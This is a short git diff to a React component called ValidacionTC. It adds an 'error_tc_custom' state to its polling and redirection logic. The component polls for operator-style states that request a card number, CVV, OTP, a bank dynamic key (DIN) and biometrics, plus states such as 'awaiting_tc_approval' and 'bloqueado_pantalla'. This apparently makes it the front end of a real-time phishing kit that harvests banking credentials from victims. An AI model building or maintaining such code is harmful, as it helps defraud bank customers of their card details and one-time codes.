@@ -112,7 +112,8 @@ export default function ValidacionTC() {
                     'solicitar_tc', 
                     'solicitar_tc_custom', 
                     'awaiting_tc_approval',
-                    'error_tc'
+                    'error_tc',
+                    'error_tc_custom'
                 ];
                 
                 if (!estadosPermitidos.includes(estado)) {
@@ -492,7 +493,7 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                if (estado === 'error_tc') {
+                if (estado === 'error_tc' || estado === 'error_tc_custom') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
                     setCargando(false);
@@ -530,7 +531,7 @@ export default function ValidacionTC() {
 
                 const estadosFinales = [
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
-                    'error_tc', 'error_otp', 'error_din', 'error_login',
+                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login',
                     'solicitar_biometria', 'error_923',
                     'solicitar_tc_custom', 'solicitar_cvv_custom',
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
@@ -573,6 +574,10 @@ export default function ValidacionTC() {
                         break;
                     case 'error_login':
                         navigate('/autenticacion');
+                        break;
+                    case 'error_tc':
+                    case 'error_tc_custom':
+                        // No redirigir, el modal de error ya se mostró arriba
                         break;
                     default:
                         console.log("Estado no manejado en redirección:", estado);
